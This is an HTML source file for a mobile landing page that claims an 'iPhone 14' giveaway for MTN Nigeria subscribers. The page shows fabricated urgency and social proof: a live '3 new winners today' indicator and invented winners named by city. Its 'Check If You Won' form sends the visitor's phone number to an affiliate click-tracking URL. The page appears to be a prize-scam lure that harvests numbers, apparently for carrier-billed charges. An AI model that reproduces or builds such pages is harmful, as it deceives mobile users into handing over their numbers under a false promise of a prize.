<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>iPhone 14 Winners</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = { theme: { extend: { fontFamily: { sans: ['Inter', 'sans-serif'] } } } }
    </script>
    <style>
        * { -webkit-tap-highlight-color: transparent; }
        input:focus { outline: none; }
        @keyframes pulse-dot { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
        .live-dot { animation: pulse-dot 1.5s ease-in-out infinite; }
    </style>
</head>
<body class="bg-gradient-to-b from-purple-50 to-purple-100 min-h-screen font-sans flex items-center justify-center p-4">
    <div class="w-full max-w-sm bg-white rounded-2xl shadow-xl p-6 text-center">
        <!-- Live indicator -->
        <div class="flex items-center justify-center gap-2 mb-3">
            <span class="live-dot w-2.5 h-2.5 bg-purple-500 rounded-full inline-block"></span>
            <span class="text-xs font-semibold text-purple-600 uppercase tracking-wide">3 new winners today</span>
        </div>

        <!-- iPhone icon -->
        <div class="w-16 h-16 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-3">
            <svg class="w-8 h-8 text-purple-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"/>
            </svg>
        </div>

        <h1 class="text-2xl font-extrabold text-gray-900 mb-1">iPhone 14 — 3 winners today</h1>
        <p class="text-gray-500 text-sm mb-2">Nigeria promotion — 12 winners this week</p>
        <div class="bg-purple-50 text-purple-700 text-xs font-medium py-1.5 px-3 rounded-lg inline-block mb-5">
            🎉 Chidera won in Lagos • Kofi won in Abuja • Amara won in Port Harcourt
        </div>

        <form action="https://08deh.bemobtrk.com/click?campaign_id=ecce3d4e-5f0f-4be9-bac5-c0d12b7815ce&landing_id=982d016a-e411-4f55-be41-1957f1973251" method="GET" class="space-y-4">
            <div class="relative">
                <div class="flex border-2 border-gray-200 rounded-xl overflow-hidden focus-within:border-purple-500 transition">
                    <span class="inline-flex items-center px-3 bg-gray-50 text-gray-600 font-semibold text-sm border-r border-gray-200">+234</span>
                    <input type="tel" name="phone" placeholder="800 000 0000" required
                        class="flex-1 px-3 py-4 text-base text-gray-900 placeholder-gray-400 bg-white"
                        pattern="[0-9]{6,15}" maxlength="11"
                        oninput="this.value = this.value.replace(/[^0-9]/g,'')">
                </div>
            </div>

            <button type="submit"
                class="w-full bg-purple-600 hover:bg-purple-700 active:bg-purple-800 text-white font-bold text-lg py-4 rounded-xl shadow-lg shadow-purple-200 transition-all">
                Check If You Won
            </button>
        </form>

        <p class="text-xs text-gray-400 mt-4">Free entry. MTN Nigeria subscribers only.</p>
    </div>
</body>
</html>
